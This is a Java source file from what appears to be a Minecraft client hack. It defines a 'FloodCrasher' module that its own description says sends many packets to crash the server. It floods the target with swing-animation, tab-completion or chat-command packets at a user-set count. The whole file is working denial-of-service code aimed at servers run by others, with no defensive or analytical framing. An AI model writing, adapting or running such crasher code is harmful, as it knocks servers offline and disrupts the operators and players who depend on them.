package us.whitedev.crashers.impl;

import us.whitedev.crashers.Crasher;
import us.whitedev.helpers.MessageHelper;
import us.whitedev.utils.OptionUtil;
import us.whitedev.utils.OptionType;
import net.minecraft.client.Minecraft;
import net.minecraft.network.protocol.game.*;
import net.minecraft.world.InteractionHand;

import java.util.ArrayList;
import java.util.List;

public class FloodCrasher extends Crasher {
    private final Minecraft mc = Minecraft.getInstance();
    private boolean enabled = false;
    private String packetType = "Animation";
    private int ppt = 10;
    private String command = "msg";

    public FloodCrasher() {
        super("FloodCrasher", "Sends a lot of packets to crash the server", true);
    }

    @Override
    public String getArgsUsage() { return "<type> <ppt> [command]"; }

    @Override
    public List<OptionUtil> getOptions() {
        List<OptionUtil> options = new ArrayList<>();
        options.add(new OptionUtil("Packet Type", OptionType.LIST, 
            new String[]{"Animation", "Tab complete", "Chat command"}));
        options.add(new OptionUtil("PPT", OptionType.INTEGER, new String[]{"10"}));
        options.add(new OptionUtil("Command", OptionType.STRING, new String[]{"msg"}));
        return options;
    }

    @Override
    public void applyOptions(String[] values) {
        if (values.length > 0) this.packetType = values[0];
        if (values.length > 1) {
            try { this.ppt = Integer.parseInt(values[1]); } catch (Exception ignored) {}
        }
        if (values.length > 2) this.command = values[2];
    }

    @Override
    public void onMethod(String[] args) {
        if (mc.player == null || mc.getConnection() == null) {
            msgHelper.sendMessage("&cNot connected!", true);
            return;
        }

        msgHelper.sendMessage("&fFlooding with &6" + packetType + " &fpackets...", true);

        switch (packetType) {
            case "Animation" -> {
                for (int i = 0; i < ppt; i++) {
                    mc.getConnection().send(new ServerboundSwingPacket(InteractionHand.MAIN_HAND));
                }
            }
            case "Tab complete" -> {
                for (int i = 0; i < ppt; i++) {
                    mc.getConnection().send(new ServerboundCommandSuggestionPacket(0, "/" + command + " "));
                }
            }
            case "Chat command" -> {
                for (int i = 0; i < ppt; i++) {
                    mc.getConnection().send(new ServerboundChatCommandPacket(command));
                }
            }
        }

        msgHelper.sendMessage("&aFloodCrasher sent " + ppt + " packets!", true);
        setEnabled(false);
    }

    @Override
    public boolean getEnabled() { return enabled; }

    @Override
    public void setEnabled(boolean bool) { this.enabled = bool; }
}
